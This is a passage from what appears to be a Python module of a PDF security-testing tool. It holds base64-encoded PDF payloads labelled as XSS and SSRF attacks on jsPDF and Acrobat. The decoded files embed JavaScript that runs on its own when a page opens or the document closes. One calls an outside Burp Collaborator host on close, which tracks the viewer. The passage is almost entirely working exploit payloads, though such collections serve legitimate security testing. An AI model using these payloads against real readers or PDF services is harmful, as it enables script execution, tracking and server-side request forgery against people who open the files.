IgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9aYXBmRGluZ2JhdHMKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9TeW1ib2wKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMiAwIG9iago8PAovUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKL0Y0IDggMCBSCi9GNSA5IDAgUgovRjYgMTAgMCBSCi9GNyAxMSAwIFIKL0Y4IDEyIDAgUgovRjkgMTMgMCBSCi9GMTAgMTQgMCBSCi9GMTEgMTUgMCBSCi9GMTIgMTYgMCBSCi9GMTMgMTcgMCBSCi9GMTQgMTggMCBSCj4+Ci9YT2JqZWN0IDw8Cj4+Cj4+CmVuZG9iagoxOSAwIG9iago8PAovUHJvZHVjZXIgKGpzUERGIDIuMS4xKQovQ3JlYXRpb25EYXRlIChEOjIwMjAxMDE1MTAwODEyKzAxJzAwJykKPj4KZW5kb2JqCjIwIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAgUgovT3BlbkFjdGlvbiBbMyAwIFIgL0ZpdEggbnVsbF0KL1BhZ2VMYXlvdXQgL09uZUNvbHVtbgo+PgplbmRvYmoKeHJlZgowIDIxCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDY5NyAwMDAwMCBuIAowMDAwMDAyNTE0IDAwMDAwIG4gCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDUwNyAwMDAwMCBuIAowMDAwMDAwNzU0IDAwMDAwIG4gCjAwMDAwMDA4NzkgMDAwMDAgbiAKMDAwMDAwMTAwOSAwMDAwMCBuIAowMDAwMDAxMTQyIDAwMDAwIG4gCjAwMDAwMDEyNzkgMDAwMDAgbiAKMDAwMDAwMTQwMiAwMDAwMCBuIAowMDAwMDAxNTMxIDAwMDAwIG4gCjAwMDAwMDE2NjMgMDAwMDAgbiAKMDAwMDAwMTc5OSAwMDAwMCBuIAowMDAwMDAxOTI3IDAwMDAwIG4gCjAwMDAwMDIwNTQgMDAwMDAgbiAKMDAwMDAwMjE4MyAwMDAwMCBuIAowMDAwMDAyMzE2IDAwMDAwIG4gCjAwMDAwMDI0MTggMDAwMDAgbiAKMDAwMDAwMjc2MiAwMDAwMCBuIAowMDAwMDAyODQ4IDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMjEKL1Jvb3QgMjAgMCBSCi9JbmZvIDE5IDAgUgovSUQgWyA8OEJERjg4Nzc2ODUzQjZBQjNBM0ZCOTlGMTQzN0ZFNjA+IDw4QkRGODg3NzY4NTNCNkFCM0EzRkI5OUYxNDM3RkU2MD4gXQo+PgpzdGFydHhyZWYKMjk1MgolJUVPRg==')
    pdf_xss16_jspdf_acrobat_executing_automatically_when_closed_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC8pID4+ID4+PDwvU3VidHlwZSAvU2NyZWVuIC9SZWN0IFswIDAgOTAwIDkwMF0gL0FBIDw8L1BDIDw8L1MvSmF2YVNjcmlwdC9KUyhhcHAuYWxlcnQoMSkpPj4vKCkgPj4gPj4KXQovQ29udGVudHMgNCAwIFIKPj4KZW5kb2JqCjQgMCBvYmoKPDwKL0xlbmd0aCAxNTAKPj4Kc3RyZWFtCjAuNTY3MDAwMDAwMDAwMDAwMSB3CjAgRwpCVAovRjEgMTYgVGYKMTguMzk5OTk5OTk5OTk5OTk4NiBUTAowIGcKNTYuNjkyOTEzMzg1ODI2Nzc3NSA3ODUuMTk3MDg2NjE0MTczMjU4NiBUZAooRXhlY3V0ZSBhdXRvbWF0aWNhbGx5IHdoZW4gY2xvc2VkKSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIF0KL0NvdW50IDEKPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjExIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEyIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLVJvbWFuCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGRJdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9aYXBmRGluZ2JhdHMKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9TeW1ib2wKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMiAwIG9iago8PAovUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKL0Y0IDggMCBSCi9GNSA5IDAgUgovRjYgMTAgMCBSCi9GNyAxMSAwIFIKL0Y4IDEyIDAgUgovRjkgMTMgMCBSCi9GMTAgMTQgMCBSCi9GMTEgMTUgMCBSCi9GMTIgMTYgMCBSCi9GMTMgMTcgMCBSCi9GMTQgMTggMCBSCj4+Ci9YT2JqZWN0IDw8Cj4+Cj4+CmVuZG9iagoxOSAwIG9iago8PAovUHJvZHVjZXIgKGpzUERGIDIuMS4xKQovQ3JlYXRpb25EYXRlIChEOjIwMjAxMDE2MTEyMTQxKzAxJzAwJykKPj4KZW5kb2JqCjIwIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAgUgovT3BlbkFjdGlvbiBbMyAwIFIgL0ZpdEggbnVsbF0KL1BhZ2VMYXlvdXQgL09uZUNvbHVtbgo+PgplbmRvYmoKeHJlZgowIDIxCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDYwNCAwMDAwMCBuIAowMDAwMDAyNDIxIDAwMDAwIG4gCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDQwMyAwMDAwMCBuIAowMDAwMDAwNjYxIDAwMDAwIG4gCjAwMDAwMDA3ODYgMDAwMDAgbiAKMDAwMDAwMDkxNiAwMDAwMCBuIAowMDAwMDAxMDQ5IDAwMDAwIG4gCjAwMDAwMDExODYgMDAwMDAgbiAKMDAwMDAwMTMwOSAwMDAwMCBuIAowMDAwMDAxNDM4IDAwMDAwIG4gCjAwMDAwMDE1NzAgMDAwMDAgbiAKMDAwMDAwMTcwNiAwMDAwMCBuIAowMDAwMDAxODM0IDAwMDAwIG4gCjAwMDAwMDE5NjEgMDAwMDAgbiAKMDAwMDAwMjA5MCAwMDAwMCBuIAowMDAwMDAyMjIzIDAwMDAwIG4gCjAwMDAwMDIzMjUgMDAwMDAgbiAKMDAwMDAwMjY2OSAwMDAwMCBuIAowMDAwMDAyNzU1IDAwMDAwIG4gCnRyYWlsZXIKPDwKL1NpemUgMjEKL1Jvb3QgMjAgMCBSCi9JbmZvIDE5IDAgUgovSUQgWyA8QjczRjE2NjcwN0YwNDU5NTdDRTg0MjM1RTgxMjBFODQ+IDxCNzNGMTY2NzA3RjA0NTk1N0NFODQyMzVFODEyMEU4ND4gXQo+PgpzdGFydHhyZWYKMjg1OQolJUVPRg==')
    pdf_ssrf27_jspdf_acrobat_track_when_closing_pdf_filesystem_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC8pID4+ID4+Cjw8L1N1YnR5cGUgL1NjcmVlbiAvUmVjdCBbMCAwIDkwMCA5MDBdIC9BQSA8PC9QQyA8PC9TL0phdmFTY3JpcHQvSlMoYXBwLmFsZXJ0KDEzMzcpO0NCU2hhcmVkUmV2aWV3SWZPZmZsaW5lRGlhbG9nKCdodHRwczovL2Nsb3NlZC5xZTg4MGEyYXFyY3Y5cWNwMGRyczFjNzdieWhvNWQuYnVycGNvbGxhYm9yYXRvci5uZXQnKSk+Pi8oKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDE0MQo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihBdXRvIGV4ZWN1dGUgd2hlbiBjbG9zZWQpIFRqCkVUCmVuZHN0cmVhbQplbmRvYmoKMSAwIG9iago8PC9UeXBlIC9QYWdlcwovS2lkcyBbMyAwIFIgXQovQ291bnQgMQo+PgplbmRvYmoKNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXIKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTAgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTEgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTIgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEzIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtUm9tYW4KL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTQgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZEl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1phcGZEaW5nYmF0cwovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1N5bWJvbAovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyIDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgNSAwIFIKL0YyIDYgMCBSCi9GMyA3IDAgUgovRjQgOCAwIFIKL0Y1IDkgMCBSCi9GNiAxMCAwIFIKL0Y3IDExIDAgUgovRjggMTIgMCBSCi9GOSAxMyAwIFIKL0YxMCAxNCAwIFIKL0YxMSAxNSAwIFIKL0YxMiAxNiAwIFIKL0YxMyAxNyAwIFIKL0YxNCAxOCAwIFIKPj4KL1hPYmplY3QgPDwKPj4KPj4KZW5kb2JqCjE5IDAgb2JqCjw8Ci9Qcm9kdWNlciAoanNQREYgMi4xLjEpCi9DcmVhdGlvbkRhdGUgKEQ6MjAyMDEwMTUxMDA1MTErMDEnMDAnKQo+PgplbmRvYmoKMjAgMCBvYmoKPDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDEgMCBSCi9PcGVuQWN0aW9uIFszIDAgUiAvRml0SCBudWxsXQovUGFnZUxheW91dCAvT25lQ29sdW1uCj4+CmVuZG9iagp4cmVmCjAgMjEKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwNjk5IDAwMDAwIG4gCjAwMDAwMDI1MTYgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwNTA3IDAwMDAwIG4gCjAwMDAwMDA3NTYgMDAwMDAgbiAKMDAwMDAwMDg4MSAwMDAwMCBuIAowMDAwMDAxMDExIDAwMDAwIG4gCjAwMDAwMDExNDQgMDAwMDAgbiAKMDAwMDAwMTI4MSAwMDAwMCBuIAowMDAwMDAxNDA0IDAwMDAwIG4gCjAwMDAwMDE1MzMgMDAwMDAgbiAKMDAwMDAwMTY2NSAwMDAwMCBuIAowMDAwMDAxODAxIDAwMDAwIG4gCjAwMDAwMDE5MjkgMDAwMDAgbiAKMDAwMDAwMjA1NiAwMDAwMCBuIAowMDAwMDAyMTg1IDAwMDAwIG4gCjAwMDAwMDIzMTggMDAwMDAgbiAKMDAwMDAwMjQyMCAwMDAwMCBuIAowMDAwMDAyNzY0IDAwMDAwIG4gCjAwMDAwMDI4NTAgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAyMQovUm9vdCAyMCAwIFIKL0luZm8gMTkgMCBSCi9JRCBbIDwyQ0IzQkU2MDg4RkQ2OEE3RDlEMjg4MjMzODZGNERCRT4gPDJDQjNCRTYwODhGRDY4QTdEOUQyODgyMzM4NkY0REJFPiBdCj4+CnN0YXJ0eHJlZgoyOTU0CiUlRU9G')
    pdf_xss17_jspdf_acrobat_executing_automatically_without_click_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC8pID4+ID4+PDwvU3VidHlwZSAvU2NyZWVuIC9SZWN0IFswIDAgOTAwIDkwMF0gL0FBIDw8L1BWIDw8L1MvSmF2YVNjcmlwdC9KUyhhcHAuYWxlcnQoMSkpPj4vKCkgPj4gPj4KXQovQ29udGVudHMgNCAwIFIKPj4KZW5kb2JqCjQgMCBvYmoKPDwKL0xlbmd0aCAxMzgKPj4Kc3RyZWFtCjAuNTY3MDAwMDAwMDAwMDAwMSB3CjAgRwpCVAovRjEgMTYgVGYKMTguMzk5OTk5OTk5OTk5OTk4NiBUTAowIGcKNTYuNjkyOTEzMzg1ODI2Nzc3NSA3ODUuMTk3MDg2NjE0MTczMjU4NiBUZAooRXhlY3V0ZSBhdXRvbWF0aWNhbGx5KSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZSAvUGFnZXMKL0tpZHMgWzMgMCBSIF0KL0NvdW50IDEKPj4KZW5kb2JqCjUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjkgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEwIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjExIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEyIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllci1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLVJvbWFuCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE0IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGRJdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTcgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9aYXBmRGluZ2JhdHMKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9TeW1ib2wKL1N1YnR5cGUgL1R5cGUxCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMiAwIG9iago8PAovUHJvY1NldCBbL1BERiAvVGV4dCAvSW1hZ2VCIC9JbWFnZUMgL0ltYWdlSV0KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKL0Y0IDggMCBSCi9GNSA5IDAgUgovRjYgMTAgMCBSCi9GNyAxMSAwIFIKL0Y4IDEyIDAgUgovRjkgMTMgMCBSCi9GMTAgMTQgMCBSCi9GMTEgMTUgMCBSCi9GMTIgMTYgMCBSCi9GMTMgMTcgMCBSCi9GMTQgMTggMCBSCj4+Ci9YT2JqZWN0IDw8Cj4+Cj4+CmVuZG9iagoxOSAwIG9iago8PAovUHJvZHVjZXIgKGpzUERGIDIuMS4xKQovQ3JlYXRpb25EYXRlIChEOjIwMjAxMDE2MTExMjA3KzAxJzAwJykKPj4KZW5kb2JqCjIwIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAgUgovT3BlbkFjdGlvbiBbMyAwIFIgL0ZpdEggbnVsbF0KL1BhZ2VMYXlvdXQgL09uZUNvbHVtbgo+PgplbmRvYmoKeHJlZgowIDIxCjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDU5MiAwMDAwMCBuIAowMDAwMDAyNDA5IDAwMDAwIG4gCjAwMDAwMDAwMTUgMDAwMDAgbiAKMDAwMDAwMDQwMyAwMDAwMCBuIAowMDAwMDAwNjQ5IDAwMDAwIG4gCjAwMDAwMDA3NzQgMDAwMDAgbiAKMDAwMDAwMDkwNCAwMDAwMCBuIAowMDAwMDAxMDM3IDAwMDAwIG4gCjAwMDAwMDExNzQgMDAwMDAgbiAKMDAwMDAwMTI5NyAwMDAwMCBuIAowMDAwMDAxNDI2IDAwMDAwIG4gCjAwMDAwMDE1NTggMDAwMDAgbiAKMDAwMDAwMTY5NCAwMDAwMCBuIAowMDAwMDAxODIyIDAwMDAwIG4gCjAwMDAwMDE5NDkgMDAwMDAgbiAKMDAwMDAwMjA3OCAwMDAwMCBuIAowMDAwMDAyMjExIDAwMDAwIG4gCjAwMDAwMDIzMTMgMDAwMDAgbiAKMDAw